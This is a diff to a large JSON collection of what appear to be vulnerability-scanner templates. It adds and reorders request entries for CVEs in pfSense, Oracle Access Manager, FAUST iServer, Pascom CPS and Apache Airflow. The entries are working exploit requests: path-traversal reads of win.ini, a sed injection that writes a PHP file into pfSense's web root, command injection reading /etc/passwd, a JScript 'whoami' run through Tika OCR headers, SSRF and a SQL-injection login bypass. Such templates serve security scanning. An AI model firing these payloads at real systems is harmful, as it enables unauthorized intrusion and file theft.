@@ -6125,11 +6125,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10250,8 +10250,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -14615,6 +14615,21 @@
       ]
     },
     {
+      "id": "CVE-2021-34805",
+      "info": {
+        "name": "FAUST iServer 9.0.018.018.4 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-35265",
       "info": {
         "name": "MaxSite CMS XSS",
@@ -14660,6 +14675,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/openam/oauth2/..;/ccversion/Version"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-35587",
+      "info": {
+        "name": "Pre-auth RCE in Oracle Access Manager",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/oam/server/opensso/sessionservice"
           ]
         }
       ]
@@ -15288,6 +15318,23 @@
       ]
     },
     {
+      "id": "CVE-2021-41282",
+      "info": {
+        "name": "pfSense Arbitrary File Write to RCE",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /index.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n__csrf_magic={{csrf_token}}&usernamefld={{username}}&passwordfld={{password}}&login=\n",
+            "GET /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\\x3c\\x3fphp+var_dump(md5(\\x27CVE-2021-41282\\x27));unlink(__FILE__)\\x3b\\x3f\\x3e/;w+/usr/local/www/test.php%0a%23 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /test.php HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41291",
       "info": {
         "name": "ECOA Building Automation System - Directory Traversal Content Disclosure",
@@ -15845,6 +15892,37 @@
       ]
     },
     {
+      "id": "CVE-2021-45967",
+      "info": {
+        "name": "Pascom CPS SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-45968",
+      "info": {
+        "name": "Pascom CPS Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /services/pluginscript/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /services/pluginscript/..;/..;/ HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-46005",
       "info": {
         "name": "Sourcecodester Car Rental Management System 1.0 - Stored Cross-Site Scripting",
@@ -16164,6 +16242,22 @@
         {
           "raw": [
             "POST /api.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nmodule=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-24288",
+      "info": {
+        "name": "Apache Airflow CVE-2022-24288 OS Command Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/airflow/code?root=&dag_id=example_passing_params_via_test_command",
+            "{{BaseURL}}/code?dag_id=example_passing_params_via_test_command"
           ]
         }
       ]
